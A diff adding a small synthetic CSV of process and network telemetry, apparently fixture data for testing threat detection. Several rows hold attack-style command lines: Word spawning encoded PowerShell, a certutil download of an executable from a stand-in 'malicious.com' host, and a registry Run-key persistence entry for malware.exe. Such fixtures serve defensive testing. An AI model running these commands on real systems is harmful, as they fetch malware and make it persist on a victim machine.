@@ -1,0 +1,10 @@
+timestamp,process,parent_process,command_line,ip,destination_port,user_agent
+2026-03-26 10:00:00,powershell.exe,winword.exe,powershell -enc aW52b2tl,8.8.8.8,443,python-requests
+2026-03-26 10:05:00,chrome.exe,explorer.exe,normal browsing,142.250.183.14,443,chrome
+2026-03-26 10:10:00,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-03-26 10:15:00,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com file.exe,23.45.67.89,80,curl/7.68
+2026-03-26 10:20:00,reg.exe,cmd.exe,reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /t REG_SZ /d malware.exe,192.168.1.5,0,none
+2026-03-26 10:25:00,evil.exe,explorer.exe,C:\\Users\\user\\AppData\\Local\\Temp\\evil.exe,10.0.0.5,0,none
+2026-03-26 10:00:00,powershell.exe,winword.exe,powershell -enc abc,8.8.8.8,443,python-requests
+2026-03-26 10:01:00,powershell.exe,winword.exe,powershell -enc xyz,8.8.4.4,443,curl
+2026-03-26 10:02:00,powershell.exe,winword.exe,powershell -enc test,1.1.1.1,80,winhttp
